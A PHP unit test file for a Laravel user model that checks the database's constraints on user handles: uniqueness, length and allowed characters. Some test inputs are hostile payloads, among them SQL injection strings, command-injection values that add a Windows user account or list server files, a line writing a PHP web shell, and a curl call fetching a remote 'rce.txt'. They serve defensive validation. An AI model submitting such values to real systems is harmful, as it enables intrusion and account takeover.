<?php

namespace Tests\Unit;

use DB;
use App\User;
use Tests\TestCase;

class UserHandleTest extends TestCase
{
    /**
     * A basic test example.
     *
     * @return void
     */
    public function testModelDoesNotAutoconvert()
    {
        $user = factory(User::class)->create([
            'handle' => $handle = 'MixedCaseHandle',
        ]);
        $this->assertEquals($handle, $user->handle);
        $this->assertEquals($handle, $user->fresh()->handle);
    }

    /**
     * @expectedException     PDOException
     * @expectedExceptionCode 23505
     * @expectedExceptionMessageRegExp /^SQLSTATE\[23505\]: Unique violation: 7 ERROR:  duplicate key value violates unique constraint "uilc_handle"/
     * @testWith        ["username1", "username1"]
     *                  ["username2", "USERNAME2"]
     *                  ["USERNAME3", "username3"]
     *                  ["USERNAME4", "USERNAME4"]
     */
    public function testDatabaseRejectsDuplicates(string $handle1, string $handle2) {
        $attr = factory(User::class)->make()->getAttributes();
        $attr['handle'] = $handle1;
        DB::table('users')->insert($attr);
        $attr = factory(User::class)->make()->getAttributes();
        $attr['handle'] = $handle2;
        DB::table('users')->insert($attr);
    }

    /**
     * @expectedException     PDOException
     * @expectedExceptionCode 23514
     * @expectedExceptionMessageRegExp /^SQLSTATE\[23514\]: Check violation: 7 ERROR:  new row for relation "users" violates check constraint "clength_handle"/
     * @testWith        ["a"]
     *                  ["bb"]
     */
    public function testDatabaseRejectsShort(string $handle) {
        factory(User::class)->create([
            'handle' => $handle,
        ]);
    }

    /**
     * @expectedException     PDOException
     * @expectedExceptionCode 23514
     * @expectedExceptionMessageRegExp /^SQLSTATE\[23514\]: Check violation: 7 ERROR:  new row for relation "users" violates check constraint "cre_handle"/
     * @testWith        ["1' or '1'='1"]
     *                  ["|| "]
     *                  ["&& whoami"]
     *                  ["; netstat -an"]
     *                  ["| net user hacker Password1 /ADD"]
     *                  ["*; ls -lhtR /var/www/"]
     *                  ["14 OR 1=1"]
     *                  ["16OR1=1"]
     *                  ["# OR 1=1#"]
     */
    public function testDatabaseRejectsStrangeCharacters(string $handle) {
        factory(User::class)->create([
            'handle' => $handle,
        ]);
    }
    /**
     * @expectedException     PDOException
     * @expectedExceptionCode 22001
     * @expectedExceptionMessageRegExp /^SQLSTATE\[22001\]: String data, right truncated: 7 ERROR:  value too long for type character varying\(32\)/
     * @testWith        ["1111111111111111111111111111111111111111111111111111"]
     *                  ["| echo \"<?php system('dir $_GET['dir']')| ?>\" > dir.php "]
     *                  ["& curl http://xerosecurity.com/rce.txt"]
     */
    public function testDatabaseRejectsLong(string $handle) {
        factory(User::class)->create([
            'handle' => $handle,
        ]);
    }
}
